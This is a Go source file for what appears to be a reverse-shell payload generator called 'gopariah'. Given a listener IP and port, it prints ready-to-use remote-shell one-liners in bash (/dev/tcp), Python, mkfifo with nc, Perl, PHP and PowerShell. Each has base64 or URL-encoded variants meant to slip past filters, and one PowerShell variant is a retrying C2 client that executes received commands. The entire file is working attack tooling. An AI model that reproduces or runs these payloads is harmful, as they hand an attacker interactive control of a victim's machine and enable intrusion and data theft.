package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net/url"
	"os"
	"unicode/utf16"
)

func main() {

	shell_type := "/bin/bash"

	args := os.Args[0:]

	if len(args) < 2 {
		fmt.Println("No arguments have been identified. Please add '-h' or '--help' for help.")
		os.Exit(0)
	}

	if (os.Args[1] == "-h" || os.Args[1] == "--help") && len(args) < 3 {
		helpText := `Usage: ./gopariah <revshell-type> <lhost> <lport> 

> Available revshells: 		
  bash
  bash_urlencode
  python
  python3
  python_b64
  python3_b64
  python_urlencode
  python3_urlencode
  mkfifo
  mkfifo_urlencode
  perl
  perl_b64
  perl_urlencode
  php
  php_b64
  php_urlencode
  powershell
  powershell_b64
  powershell_urlencode`

		fmt.Println(helpText)
	}

	if len(args) == 3 {
		fmt.Println("An argument is missing. Remember that you have to supply local ip and local port.")
		os.Exit(0)
	}

	if os.Args[1] == "bash" {
		payload := fmt.Sprintf("%s -i >& /dev/tcp/%s/%s 0>&1", shell_type, os.Args[2], os.Args[3])
		fmt.Println(payload)
	}

	if os.Args[1] == "bash_urlencode" {
		payload := fmt.Sprintf("%s -i >& /dev/tcp/%s/%s 0>&1", shell_type, os.Args[2], os.Args[3])
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "python" {
		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(payload)
	}

	if os.Args[1] == "python3" {
		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(payload)
	}

	if os.Args[1] == "python_b64" {
		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		input := []byte(payload)
		encoded := base64.StdEncoding.EncodeToString(input)
		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
	}

	if os.Args[1] == "python3_b64" {
		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		input := []byte(payload)
		encoded := base64.StdEncoding.EncodeToString(input)
		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
	}

	if os.Args[1] == "python_urlencode" {
		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "python3_urlencode" {
		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "mkfifo" {
		payload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f", shell_type, os.Args[2], os.Args[3])
		fmt.Println(payload)
	}

	if os.Args[1] == "mkfifo_urlencode" {
		payload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f", shell_type, os.Args[2], os.Args[3])
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "perl" {
		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(payload)
	}

	if os.Args[1] == "perl_b64" {
		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
		input := []byte(payload)
		encoded := base64.StdEncoding.EncodeToString(input)
		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
	}

	if os.Args[1] == "perl_urlencode" {
		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "php" {
		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(payload)
	}

	if os.Args[1] == "php_b64" {
		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
		input := []byte(payload)
		encoded := base64.StdEncoding.EncodeToString(input)
		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
	}

	if os.Args[1] == "php_urlencode" {
		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
		fmt.Println(url.QueryEscape(payload))
	}

	if os.Args[1] == "powershell" {
		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
		fmt.Println(payload)
	}

	if os.Args[1] == "powershell_b64" {
		payload := fmt.Sprintf(`do {
			# Delay before establishing network connection, and between retries
			Start-Sleep -Seconds 1
		
			# Connect to C2
			try{
				$TCPClient = New-Object Net.Sockets.TCPClient('%s', %s)
			} catch {}
		} until ($TCPClient.Connected)
		
		$NetworkStream = $TCPClient.GetStream()
		$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
		
		# Writes a string to C2
		function WriteToStream ($String) {
			# Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
			[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | %% {0}
		
			# Write to C2
			$StreamWriter.Write($String + 'SHELL> ')
			$StreamWriter.Flush()
		}
		
		# Initial output to C2. The function also creates the inital empty byte array buffer used below.
		WriteToStream ''
		
		# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
		while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
			# Encode command, remove last byte/newline
			$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
			
			# Execute command and save output (including errors thrown)
			$Output = try {
					Invoke-Expression $Command 2>&1 | Out-String
				} catch {
					$_ | Out-String
				}
		
			# Write output to C2
			WriteToStream ($Output)
		}
		# Closes the StreamWriter and the underlying TCPClient
		$StreamWriter.Close()`, os.Args[2], os.Args[3])

		utf16Payload := utf16.Encode([]rune(payload))
		utf16Bytes := make([]byte, len(utf16Payload)*2)
		for i, v := range utf16Payload {
			binary.LittleEndian.PutUint16(utf16Bytes[i*2:], v)
		}

		encoded := base64.StdEncoding.EncodeToString(utf16Bytes)
		fmt.Println("powershell.exe -e " + encoded)
	}

	if os.Args[1] == "powershell_urlencode" {
		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
		fmt.Println(url.QueryEscape(payload))
	}

}
